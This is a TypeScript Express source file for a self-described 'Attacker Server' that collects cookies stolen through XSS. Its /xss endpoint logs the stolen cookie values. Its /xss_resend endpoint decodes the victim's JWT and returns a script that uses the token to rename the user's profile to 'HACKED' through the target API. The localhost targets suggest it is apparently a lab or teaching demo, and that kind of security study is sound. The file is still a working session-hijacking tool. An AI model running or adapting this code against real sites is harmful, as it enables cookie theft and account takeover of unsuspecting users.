import express from 'express';
import logCookie from './logger';
import path from 'path';
import { jwtDecode } from "jwt-decode";

const app = express();
const port = 4000;

const brokenImagePath = path.join(__dirname, '../src/img/image.jpeg');


app.get('/xss', (req, res) => {
    const cookieValue = req.query.cookie;
    const referer = req.headers.referer;
    if (cookieValue && referer) {
        logCookie(cookieValue.toString(), referer)
        console.log('Received cookie:', cookieValue);
        // console.log(req)
        // res.redirect(referer);
        // res.sendFile(brokenImagePath)
        res.sendStatus(200)
    }
})

app.get('/xss_resend', (req, res) => {
    const cookieValue = req.query.cookie;
    const referer = req.headers.referer;
    if (cookieValue && referer) {
        logCookie(cookieValue.toString(), referer);
        console.log('Received cookie:', cookieValue);
        let trimcookie= cookieValue.toString().substring("jwt=".length)
        const decode = jwtDecode(trimcookie)
       res.send(`
            <script>
                (function() {
                    fetch("http://localhost:3000/api/user/aendern", {
                        method: "PUT",
                        headers: {
                            "Content-Type": "application/json",
                            "Authorization": "Bearer ${trimcookie}"
                        },
                        body: JSON.stringify({
                            id: "${decode.sub}",
                            name:"HACKED"
                        })
                    }).then(response => {
                        window.location.href = "http://localhost:3000/Profile.html?id=${decode.sub}";
                    }).catch(error => {
                        console.error("Error:", error);
                    });
                })();
            </script>
        `);
    } else {
        res.sendStatus(400);
    }
});

app.get("/", (req, res) => {
    res.send('Attacker Server');
});

app.listen(port, () => {
    console.log(`Attacker server is running on port http://localhost:${port}`);
});
